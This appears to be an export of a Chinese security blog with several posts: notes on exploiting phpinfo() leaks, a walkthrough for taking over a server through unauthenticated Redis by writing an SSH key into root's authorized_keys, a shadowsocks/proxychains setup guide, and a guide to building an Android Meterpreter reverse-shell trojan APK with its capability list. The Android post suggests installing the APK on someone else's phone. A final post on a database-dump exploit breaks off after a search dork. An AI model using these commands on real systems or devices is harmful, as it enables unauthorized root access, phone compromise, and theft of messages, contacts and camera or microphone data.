<h3 id="ENABLE-DL"><a href="#ENABLE-DL" class="headerlink" title="ENABLE_DL"></a>ENABLE_DL</h3><p><img src="https://i.loli.net/2019/11/11/bNoQGzyewhmlJSV.png" alt="8k74aidbj9.png"><br>上面说的利用扩展库绕过disable_functions，需要使用dl()并且开启这个选项</p>
<h3 id="MAGIC-QUOTES-GPC"><a href="#MAGIC-QUOTES-GPC" class="headerlink" title="MAGIC_QUOTES_GPC"></a>MAGIC_QUOTES_GPC</h3><p><img src="https://i.loli.net/2019/11/11/Bi4fhpxmgIRNJA2.png" alt="f7ec27jdde.png"><br>这个就不用多说了吧</p>
<h3 id="OPEN-BASEDIR"><a href="#OPEN-BASEDIR" class="headerlink" title="OPEN_BASEDIR"></a>OPEN_BASEDIR</h3><p><img src="https://i.loli.net/2019/11/11/H6lsyFAWvepZg51.png" alt="cd2e9khhfh.png"><br>这个参数将用户可操作的文件限制在某目录下，但是这个限制是可以绕过的。</p>
<p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p>
<p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5全版本绕过open_basedir读文件脚本</a></p>
<p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="noopener">绕过open_basedir读文件脚本</a></p>
<h3 id="PHP-VARIABLES"><a href="#PHP-VARIABLES" class="headerlink" title="PHP VARIABLES"></a>PHP VARIABLES</h3><p>真实IP</p>
<p><img src="https://i.loli.net/2019/11/11/6fU9gDMBptNsFuZ.png" alt="20190228104758.png"><br><img src="https://i.loli.net/2019/11/11/loGXckW3xfrBgsA.png" alt="20190228104923.png"></p>
<p>cdn什么的都不存在的，找到真实ip，扫一扫旁站，没准就拿下几个站。</p>
<p>当网站使用了nginx反向代理时，如果反代服务器和web服务器在同一内网，这个值可能会是内网ip。</p>
<p>当网站在docker中运行时，这个值会是宿主机docker网卡上的ip。</p>
<h3 id="WEB根目录"><a href="#WEB根目录" class="headerlink" title="WEB根目录"></a>WEB根目录</h3><p><img src="https://i.loli.net/2019/11/11/wilgIo9VK6Nvy3D.png" alt="20190228105655.png"></p>
<p>$_SERVER[‘DOCUMENT_ROOT’]可能会有偏差。</p>
<h3 id="临时文件路径"><a href="#临时文件路径" class="headerlink" title="临时文件路径"></a>临时文件路径</h3><p>向phpinfo()页面post一个shell（自己写一个上传页面），可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了。<br><img src="https://i.loli.net/2019/11/11/5sIoVtyWTAjqMYO.png" alt="81ach81k8j.png"><br><a href="https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo" target="_blank" rel="noopener">https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo</a></p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="IMAGICK"><a href="#IMAGICK" class="headerlink" title="IMAGICK"></a>IMAGICK</h3><p>前段时间影响比较大的漏洞，注意看版本。<br>漏洞影响ImageMagick 6.9.3-10之前的版本，包括ubuntu源中安装的ImageMagick。</p>
<p><a href="http://blog.topsec.com.cn/imagemagick-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f%e5%8f%8a%e5%88%86%e6%9e%90/" target="_blank" rel="noopener">ImageMagick 漏洞利用方式及分析</a></p>
<h3 id="LIBXML"><a href="#LIBXML" class="headerlink" title="LIBXML"></a>LIBXML</h3><p>libxml 2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的 xml 文件时未对 xml 文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，会导致XXE。</p>
<h3 id="MEMCACHE"><a href="#MEMCACHE" class="headerlink" title="MEMCACHE"></a>MEMCACHE</h3><p><a href="http://blog.nsfocus.net/memcache-unauthorized-access-exploit/" target="_blank" rel="noopener">Memcache未授权访问漏洞利用及修复</a></p>
<h3 id="REDIS"><a href="#REDIS" class="headerlink" title="REDIS"></a>REDIS</h3><p>redis也不用多说了吧</p>
<h3 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h3><p>主要是序列化的一些问题<br><img src="https://i.loli.net/2019/11/11/DaISomhEFGnvPVT.png" alt="7g4402ghe1.png"><br>序列化处理器不一致导致对象注入:<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。<br>具体可看：<a href="https://seaii-blog.com/index.php/2017/09/12/70.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2017/09/12/70.html</a></p>
<h3 id="OPCACHE"><a href="#OPCACHE" class="headerlink" title="OPCACHE"></a>OPCACHE</h3><p>当开启了opcache并可以上传文件时，可以在本地生成一个与服务器文件名相同的文件，并生成缓存文件xx.php.bin。上传后恶意缓存文件会将服务器上的原文件覆盖，从而getshell。</p>
<p>需要将缓存文件的system_id和timestamp两个字段为服务器上文件的值。<br>system_id可以使用工具<a href="https://github.com/GoSecure/php7-opcache-override修改。" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override修改。</a></p>
<h3 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h3><p><a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2018-19518/README.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/php/CVE-2018-19518/README.md</a></p>
<hr>
<p>另外发一个小工具：<a href="https://github.com/proudwind/phpinfo_scanner" target="_blank" rel="noopener">https://github.com/proudwind/phpinfo_scanner</a><br>这个能自动抓取phpinfo把有用的信息给呈现出来</p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis服务（6379端口）入侵</title>
    <url>/2018/11/01/Redis%E6%9C%8D%E5%8A%A1%EF%BC%886379%E7%AB%AF%E5%8F%A3%EF%BC%89%E5%85%A5%E4%BE%B5/</url>
    <content><![CDATA[<h3 id="一：安装gcc编译环境（有就不用装了）"><a href="#一：安装gcc编译环境（有就不用装了）" class="headerlink" title="一：安装gcc编译环境（有就不用装了）"></a>一：安装gcc编译环境（有就不用装了）</h3><a id="more"></a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install gcc</span><br><span class="line">apt-get install g++</span><br></pre></td></tr></table></figure>
<h3 id="二：安装redis服务（有就不用装了）"><a href="#二：安装redis服务（有就不用装了）" class="headerlink" title="二：安装redis服务（有就不用装了）"></a>二：安装redis服务（有就不用装了）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">tar xzf redis-4.0.10.tar.gz </span><br><span class="line">cd redis-4.0.10/</span><br><span class="line">make &amp;amp;&amp;amp; make install</span><br></pre></td></tr></table></figure>
<p>安装到这里就可以了，不需要安装服务端，只要客户端就好了。</p>
<h3 id="三：生成ssh公钥"><a href="#三：生成ssh公钥" class="headerlink" title="三：生成ssh公钥"></a>三：生成ssh公钥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/2ZfPlExUrKJOtoC.png" alt="cf2d31f0-cb50-407f-a322-5565f2ffe5e2-image.png"></p>
<p>如图，这个3个地方都是回车就好，不需要输入什么其他的东西的。</p>
<p>之后就是百度的东西了</p>
<h3 id="四：入侵redis"><a href="#四：入侵redis" class="headerlink" title="四：入侵redis"></a>四：入侵redis</h3><ul>
<li>先连接redis看看</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.88.136 6379</span><br><span class="line">redis-cli -h 192.168.88.136</span><br></pre></td></tr></table></figure>
<p>telnet的这个命令，它的显示是这样的：<br><img src="https://i.loli.net/2019/11/11/3tyCjfKkUdqL58v.png" alt="0e55a104-6ca5-4500-9faf-451e3a48ebc2-image.png"></p>
<p>这个奇怪的东西是告诉你“按 ctrl + ] 可以变正常…..！ ”<br>不管上面那个，按了之后再quit退出来吧，只要知道能连接就好了，如下图：</p>
<p><img src="https://i.loli.net/2019/11/11/VgXEAc1G5sPovaK.png" alt="feb9334e-a6df-42fb-b9e6-96b5955cb125-image.png"></p>
<p>然后redis-cli的那个命令也是一样的，能连接就可以了</p>
<p><img src="https://i.loli.net/2019/11/11/sWyh28BnjRvV4Zx.png" alt="8d194620-40f1-4469-90c9-9eeee615bd04-image.png"></p>
<p>接下来：</p>
<ul>
<li>清一下redis数据库</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.88.136 flushall</span><br></pre></td></tr></table></figure>

<ul>
<li>向redis写自己的公钥</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub | redis-cli -h 192.168.88.136 -x set redis</span><br></pre></td></tr></table></figure>
<p>开始生成的公钥也就是id_rsa.pub文件在~/.ssh/文件夹里面，自己把它cope出来或者就在那个/.ssh</p>
<p>/目录执行命令也行</p>
<ul>
<li>利用redis写入到文件中</li>
</ul>
<p>连接redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.88.136</span><br></pre></td></tr></table></figure>
<p>查看keys</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136&gt; keys *</span><br></pre></td></tr></table></figure>
<p>写入配置库的路径及存放位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136&gt; CONFIG SET dir /root/.ssh/</span><br></pre></td></tr></table></figure>
<p>写入配置库名称及存放的名字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136&gt; CONFIG SET dbfilename &quot;authorized_keys&quot;</span><br></pre></td></tr></table></figure>
<p>保存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136&gt; save</span><br></pre></td></tr></table></figure>
<p>退出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136&gt; exit</span><br></pre></td></tr></table></figure>
<p>OK！远程连接一下服务器吧！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.88.136</span><br></pre></td></tr></table></figure>


<p>参考链接：<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/61101.html</a></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>shadowsocks</title>
    <url>/2018/10/15/shadowsocks/</url>
    <content><![CDATA[<p>本文第一部分叙述在linux服务器上搭建shadowsocks服务端和在windows或linux上搭建shadowsocks客户端。第二部分叙述在linux服务器上搭建proxychains服务的心得。第三部分是2018/11/28更新在windows服务器上搭建shadowsocks服务端。</p><a id="more"></a>
<h2 id="第一部分："><a href="#第一部分：" class="headerlink" title="第一部分："></a>第一部分：</h2><p>（1）：在linux服务器上搭建shadowsocks服务器<br>这里的linux服务器呢，主要是以CentOS、Debian/Ubuntu居多，而且是需要国外的，这样才能通向国外的网，上google之类的翻墙。其实命令上都是差不多的，主要是看服务器的版本，今天我一开始用的CentOS6的，奈何上面只有python2.6。然后我又更新成pyhthon2.7，还要下载wget命令、xz命令，累的半死。结果最后直接换成centos7的服务器就好了，直接现成的PYthon2.7。安装pip之类的很方便<br>废话不多说，命令如下：</p>
<p>1.确认自己的服务器python版本，终端下输入如下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python （回显是2.6的要记得换成2.7）</span><br></pre></td></tr></table></figure>
<p>2.安装pip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python-pip</span><br><span class="line">或者</span><br><span class="line">curl &quot;https://bootstrap.pypa.io/get-pip.py&quot; -o &quot;get-pip.py&quot;</span><br><span class="line">python get-pip.py</span><br><span class="line">或者</span><br><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum -y install python-pip</span><br></pre></td></tr></table></figure>
<p>（有的系统不是用aot-get而是yum。自己分辨一下，这一步主要是安装pip）</p>
<p>3.升级pip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip</span><br><span class="line">或者</span><br><span class="line">sudo pip install --upgrade pip</span><br><span class="line">（这一步不是关键，但是能升级的还是升级一下）</span><br><span class="line">安装好pip之后可以用过如下命令查看版本：</span><br><span class="line">pip -v</span><br></pre></td></tr></table></figure>
<p>4.安装shadowsocks</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install shadowsocks</span><br><span class="line">或者</span><br><span class="line">sudo pip install --upgrade pip</span><br></pre></td></tr></table></figure>
<p>（都是一样的命令，安装好之后会显示Complete！或success啥的）<br>安装好shadowsocks之后就要配置文件了</p>
<p>5.配置shadowsocks文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir /etc/shadowsocks            //在etc下创建shadowsocks文件夹</span><br><span class="line">vim /etc/shadowsocks/config.json       //创建配置文件</span><br><span class="line">第5步按照网上的常规方法有个坑，那就是直接在etc下创建一个shadowsocks.json的文件，但是我今天尝试的时候失败了，没有用，还是创建config.json文件管用点。</span><br></pre></td></tr></table></figure>

<p>6.在config.json文件中写入以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; </span><br><span class="line">      &quot;server&quot;:&quot;server_ip&quot;,         //server_ip写上0.0.0.0或者自己服务器的外网IP都可以，但是不能写127.0.0.1</span><br><span class="line">      &quot;server_port&quot;:8001,             //网上有说过写低端口号网速会快，但是，我今天被大佬说了，还是写高端口号。比如我就写的8001</span><br><span class="line">      &quot;local_address&quot;: &quot;127.0.0.1&quot;,    //不用动</span><br><span class="line">      &quot;local_port&quot;:1080,               //不用动</span><br><span class="line">      &quot;password&quot;:&quot;password&quot;,          //password写上自己回头用客户端连接时需要用的密码</span><br><span class="line">       &quot;timeout&quot;:300,                  //不用动</span><br><span class="line">      &quot;method&quot;:&quot;rc4-md5&quot;,            //大佬说如果是放在路由器上的话可以写成aes-256-cfb，但是自己一般用的话就换成rc4-md5加密方法</span><br><span class="line">      &quot;fast_open&quot;: false                //不用动</span><br><span class="line">   &#125; </span><br><span class="line"></span><br><span class="line">// 单用户，就直接按上面的来就好了，有多个用户的话就用下面的。。</span><br><span class="line">   &#123;</span><br><span class="line">       &quot;server&quot;:&quot;server_ip&quot;,     //一样的，服务器外网IP</span><br><span class="line">       &quot;port_password&quot;:&#123;</span><br><span class="line">           &quot;port_1&quot;:&quot;pwd1&quot;,       //这里写成&quot;端口&quot;：&quot;密码&quot;的形式</span><br><span class="line">           &quot;port_2&quot;:&quot;pwd2&quot;,        //比如：&quot;8001&quot;:&quot;password123&quot;</span><br><span class="line">           &quot;port_3&quot;:&quot;pwd3&quot;         //&quot;8002&quot;:&quot;password456&quot;</span><br><span class="line">       &#125;,</span><br><span class="line">       &quot;local_address&quot;:&quot;127.0.0.1&quot;,   //一样不用动</span><br><span class="line">       &quot;local_port&quot;:1080,               //不动</span><br><span class="line">       &quot;timeout&quot;:300,                  //不动</span><br><span class="line">       &quot;method&quot;:&quot;aes-256-cfb&quot;           //自己用就rc4-md5，如果放路由器的话就aes...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>如果你们在纠结服务器IP和端口怎么写的话，其实这个问题我一开始也在纠结，服务器IP很好理解就是你的国外服务器的公网IP地址，端口就随便一个端口（不要跟常用服务重复），到时候客户端通过这个端口进行流量的传输而已。密码的话不是你服务器的密码只是你客户端连接时输入的密码。</p>
<p>7.开启和关闭服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks/config.json -d start       //开启</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d stop        //关闭</span><br></pre></td></tr></table></figure>
<p>然后开启服务就好了，基本上不需要再动什么了。接下来就是客户端的配置了</p>
<h2 id="第二部分：在WINDOWS上安装SHADOWSOCKS客户端"><a href="#第二部分：在WINDOWS上安装SHADOWSOCKS客户端" class="headerlink" title="第二部分：在WINDOWS上安装SHADOWSOCKS客户端"></a>第二部分：在WINDOWS上安装SHADOWSOCKS客户端</h2><p>github链接：<a href="https://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks-windows/releases</a><br><img src="https://i.loli.net/2019/11/11/2KY9kTJbCAZGnBM.png" alt="37ef61a9-06c5-40f1-9e38-8ac7eedcf38c-image.png"></p>
<p>下载就OK了，配置如下：</p>
<p><img src="https://i.loli.net/2019/11/11/STmLeEW5J6Pyvu8.png" alt="f328fd6a-b1a6-422d-ba84-f1e8405e3c50-image.png"></p>
<p>填好你开始在服务端配置的IP，端口，密码就好了，然后配置全局代理，如下图：</p>
<p><img src="https://i.loli.net/2019/11/11/ERNrqcTdaytelkS.png" alt="5beacffd-516b-42b4-9e91-4ba52231ce41-image.png"></p>
<h2 id="第三部分：在LINUX上安装SHADOWSOCKS客户端"><a href="#第三部分：在LINUX上安装SHADOWSOCKS客户端" class="headerlink" title="第三部分：在LINUX上安装SHADOWSOCKS客户端"></a>第三部分：在LINUX上安装SHADOWSOCKS客户端</h2><p>在linux上安装客户端和第一步在服务器上安装服务端是一样的步骤，同样是python2.7环境、安装pip、安装shadowsocks。甚至连config.json文件的创建和配置都是一模一样的。。。<br>唯一的区别在于启动方式不同。客户端启动是如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sslocal -c /etc/shadowsocks/config.json    //开启</span><br></pre></td></tr></table></figure>

<p>开启之后就有点想ngrok的运行状态，终端是不能关闭的，关闭了终端就关闭了连接。。。。另外，安装好shadowsocks客户端之后，linux依然是上不了google的，还要设置代理，也就是下一部分</p>
<h3 id="第四部分：安装PROXYCHAINS"><a href="#第四部分：安装PROXYCHAINS" class="headerlink" title="第四部分：安装PROXYCHAINS"></a>第四部分：安装PROXYCHAINS</h3><p>我在其他的linux版本上没有试过，我今天也是在kali里面弄得proxychains，kali里面自带了这个软件，其他的linux系统没有软件的可以自己下载，链接： <a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="noopener">https://github.com/rofl0r/proxychains-ng</a><br>kali中配置proxychains：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf     //编辑proxychains的配置文件</span><br></pre></td></tr></table></figure>

<p>将文件中最后一样的 socks4 127.0.0.1 9050为socks5 127.0.0.1 1080。。。保存，OK！<br>测试一下：</p>
<p><img src="https://i.loli.net/2019/11/11/YDZbanmUHSRqwzM.png" alt="a71a3fd7-da08-491a-be8b-56be7552c8f2-image.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxyresolv www.google.com      //显示什么什么OK就说明可以用了</span><br></pre></td></tr></table></figure>

<p>然后需要翻墙时就在命令最前面加上：proxychains，，，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole     //打开MSF</span><br><span class="line">proxychains git clone https://github.com/xxx/xxx      //下载github文件</span><br><span class="line">proxychains firefox     //打开火狐浏览器（这样你用火狐是可以直接翻墙的）</span><br></pre></td></tr></table></figure>

<p>如果觉得太麻烦，每次都要打那么一大串字母，你可以使用proxychains去打开一个终端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains zsh</span><br></pre></td></tr></table></figure>

<p>接着在zsh终端里直接输入命令就OK，同样也是翻墙的哦！！！</p>
<hr>
<p>这样一个过程花不了你多久的时间，但却可以给你带来很宝贵的经验，并且也同时打开了一个新世界的大门，想去哪去哪。。。。自己制作翻墙要比下载那些免费VPN要安全的多，网速也要好的多，其中道理我就不讲了。溜了</p>
<hr>
<p>2018/11/28更新： 在windows服务器上搭建shadowsocks服务端</p>
<p>1、首先需要去github上下载集成工具，链接：<a href="https://github.com/shadowsocks/libQtShadowsocks/releases" target="_blank" rel="noopener">https://github.com/shadowsocks/libQtShadowsocks/releases</a> （注意别下载源码包，不然你自己手动编译去）</p>
<p>2、解压出来后是一个shadowsocks-libqss.exe，放到一个文件夹里去，随后在同目录下新建一个config.json的文件，其内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">        &quot;server&quot;:&quot;0.0.0.0&quot;,  //不动</span><br><span class="line">        &quot;server_port&quot;:8023,  //这里填你要连接的端口</span><br><span class="line">        &quot;local_address&quot;:&quot;127.0.0.1&quot;,  //不动</span><br><span class="line">        &quot;local_port&quot;:1080,  //不动</span><br><span class="line">        &quot;password&quot;:&quot;wyvbboy&quot;,  //密码</span><br><span class="line">        &quot;timeout&quot;:600,  //超时时间，基本不动</span><br><span class="line">        &quot;method&quot;:&quot;aes-256-cfb&quot;,  //协议，见上文</span><br><span class="line">        &quot;http_proxy&quot;: false,  //不动</span><br><span class="line">        &quot;auth&quot;: false  //不动</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>3、在同目录下新建启动文件shadowsocks.bat，其内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off  </span><br><span class="line">   shadowsocks-libqss.exe -c config.json -S</span><br></pre></td></tr></table></figure>

<p>4、双击bat文件，会打开一个窗口，之后在客户端连接就好了，服务端的窗口不能关闭，关闭就结束进程了。</p>
<hr>
<p>tips:</p>
<p>1、启动shadowsocks报错，是由于openssl升级到1.1.0以上版本以后弃用了一个函数，具体解决办法是：</p>
<p>用vi打开文件：vi /usr/lib/python2.7/site-packages/shadowsocks/crypto/openssl.py（大概是这个目录，具体看报错）</p>
<p>将第52行libcrypto.EVP_CIPHER_CTX_cleanup.argtypes = (c_void_p,)<br>改为libcrypto.EVP_CIPHER_CTX_reset.argtypes = (c_void_p,)</p>
<p>再次搜索cleanup（全文件共2处，此处位于111行），将libcrypto.EVP_CIPHER_CTX_cleanup(self._ctx)<br>改为libcrypto.EVP_CIPHER_CTX_reset(self._ctx)</p>
<p>保存并退出</p>
<p>2、proxychains不显示多余的信息可以在/etc/proxychains.conf中将以下设置的注释去掉</p>
<p><img src="https://i.loli.net/2019/11/11/FKjvDieQpzHBImC.png" alt="c56604d5-4ac4-43c4-b943-0e8500c9e0d2-image.png"></p>
]]></content>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透安卓手机</title>
    <url>/2018/06/11/%E6%B8%97%E9%80%8F%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA/</url>
    <content><![CDATA[<p>这篇文章还是在学校的时候写的，原来都这么久了啊，现在看起来一点技术含量都没有。。。</p><a id="more"></a>
<hr>
<p>网上都能找的到的教程，在这里我只是发出来做个保存+分享<br>在kali中，步骤：</p>
<p>输入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.105 LPORT=5555 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure>

<p>（LHOST填写自己的kali的IP地址、LPORT填写通信端口，可以自己更改 、最后面的路径是生成出APP文件的路径以及文件名）</p>
<p>然后启动msf：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<p>然后输入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler //加载模块</span><br><span class="line">set payload android/meterpreter/reverse_tcp //选择Payload</span><br><span class="line">show options //查看参数设置</span><br><span class="line">set LHOST 192.168.1.114 //这里的地址设置成我们刚才生成APP木马的IP地址</span><br><span class="line">set LPORT 5555 //这里的端口设置成刚才我们生成木马所监听的端口</span><br><span class="line">exploit //开始执行漏洞 开始监听,等待手机上线</span><br></pre></td></tr></table></figure>
<p>可以把生成出来的APP放入别人手机中，实验的话把需要的权限都开上吧，打开APP，其实是打不开的，点击一下APP就已经开始工作了。然后便可在kali中输入“？”查看到所有可以执行的命令。</p>
<p>以下是全部命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">核心命令</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">     命令                      说明</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         帮助菜单</span><br><span class="line">    background                当前会话</span><br><span class="line">    bgkill                    终止一个meterpreter脚本</span><br><span class="line">    bglist                    列出运行后台脚本</span><br><span class="line">    bgrun                     执行一个meterpreter脚本作为后台线程</span><br><span class="line">    channel                   显示信息或控制活动频道</span><br><span class="line">    close                     关闭频道</span><br><span class="line">    disable_unicode_encoding  禁用unicode字符串的编码</span><br><span class="line">    enable_unicode_encoding   启用unicode字符串的编码</span><br><span class="line">    exit                      终止meterpreter会话</span><br><span class="line">    get_timeouts              获取当前会话超时值</span><br><span class="line">    guid                      获取会话GUID</span><br><span class="line">    help                      帮助菜单</span><br><span class="line">    info                      显示有关Post模块的信息</span><br><span class="line">    irb                       进入irb脚本模式</span><br><span class="line">    load                      加载一个或多个meterpreter扩展</span><br><span class="line">    machine_id                获取连接到会话的计算机的MSF ID</span><br><span class="line">    quit                      终止meterpreter会话</span><br><span class="line">    read                      从频道读取数据</span><br><span class="line">    resource                  运行存储在文件中的命令</span><br><span class="line">    run                       执行meterpreter脚本或Post模块</span><br><span class="line">    sessions                  快速切换到另一个会话</span><br><span class="line">    set_timeouts              设置当前会话超时值</span><br><span class="line">    sleep                     暴力静止Meterpreter会话，然后重新建立会话。</span><br><span class="line">    transport                 更改当前的传输机制</span><br><span class="line">    use                       不推荐使用“load”别名</span><br><span class="line">    uuid                      获取当前会话的UUID</span><br><span class="line">    write                     将数据写入通道</span><br><span class="line"></span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">============================</span><br><span class="line">     命令          说明</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           将文件的内容读取到屏幕上</span><br><span class="line">    cd            更改目录</span><br><span class="line">    checksum      检索文件的校验和</span><br><span class="line">    cp            将源复制到目标</span><br><span class="line">    dir           列表文件（ls的别名）</span><br><span class="line">    download      下载文件或目录</span><br><span class="line">    edit          编辑文件</span><br><span class="line">    getlwd        打印本地工作目录</span><br><span class="line">    getwd         打印工作目录</span><br><span class="line">    lcd           更改本地工作目录</span><br><span class="line">    lls           列出本地文件</span><br><span class="line">    lpwd          打印本地工作目录</span><br><span class="line">    ls            列出文件</span><br><span class="line">    mkdir         建立目录</span><br><span class="line">    mv            将源移到目标</span><br><span class="line">    pwd           打印工作目录</span><br><span class="line">    rm            删除指定的文件</span><br><span class="line">    rmdir         删除目录</span><br><span class="line">    search        搜索文件</span><br><span class="line">    upload        上传文件或目录</span><br><span class="line"></span><br><span class="line">Stdapi：网络命令</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">     命令          说明</span><br><span class="line">    -------       -----------</span><br><span class="line">    ifconfig      显示界面</span><br><span class="line">    ipconfig      显示界面</span><br><span class="line">    portfwd       将本地端口转发到远程服务</span><br><span class="line">    route         查看和修改路由表</span><br><span class="line"></span><br><span class="line">Stdapi：系统命令</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">     命令          说明</span><br><span class="line">    -------       -----------</span><br><span class="line">    execute       执行一个命令</span><br><span class="line">    getuid        获取服务器正在运行的用户</span><br><span class="line">    localtime     显示目标系统的本地日期和时间</span><br><span class="line">    pgrep         按名称过滤进程</span><br><span class="line">    ps            列出运行的进程</span><br><span class="line">    shell         放入系统命令外壳</span><br><span class="line">    sysinfo       获取有关远程系统的信息，例如OS</span><br><span class="line"></span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">     命令          说明</span><br><span class="line">    -------       -----------</span><br><span class="line">    screenshot    获取交互式桌面的屏幕截图</span><br><span class="line"></span><br><span class="line">Stdapi：网络摄像头命令</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">     命令           说明</span><br><span class="line">    -------        -----------</span><br><span class="line">    record_mic     从默认麦克风录制音频X秒</span><br><span class="line">    webcam_chat    开始视频聊天</span><br><span class="line">    webcam_list    列出网络摄像头</span><br><span class="line">    webcam_snap    从指定的摄像头拍摄快照</span><br><span class="line">    webcam_stream  从指定的摄像头播放视频流</span><br><span class="line"></span><br><span class="line">Android命令</span><br><span class="line">================</span><br><span class="line">     命令              说明</span><br><span class="line">    -------           -----------</span><br><span class="line">    activity_start    从Uri字符串开始一个Android活动</span><br><span class="line">    check_root        检查设备是否生根</span><br><span class="line">    dump_calllog      获取通话记录</span><br><span class="line">    dump_contacts     获取联系人列表</span><br><span class="line">    dump_sms          获取短信</span><br><span class="line">    geolocate         使用地理位置获取当前的经纬度</span><br><span class="line">    hide_app_icon     隐藏启动器中的应用程序图标</span><br><span class="line">    interval_collect  管理间隔收集功能</span><br><span class="line">    send_sms          从目标会话发送短信</span><br><span class="line">    set_audio_mode    设置振铃模式</span><br><span class="line">    sqlite_query      从存储中查询SQLite数据库</span><br><span class="line">    wakelock          启用/禁用Wakelock</span><br><span class="line">    wlan_geolocate    使用WLAN信息获取当前经纬度</span><br></pre></td></tr></table></figure>

















]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>老的爆库EXP</title>
    <url>/2018/06/09/%E8%80%81%E7%9A%84%E7%88%86%E5%BA%93EXP/</url>
    <content><![CDATA[<p>第一个：<br>关键字：</p><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:&quot;HomeMarket.asp&quot;</span><br></pre></td></tr></table></figure>
<p>EXP：</p>
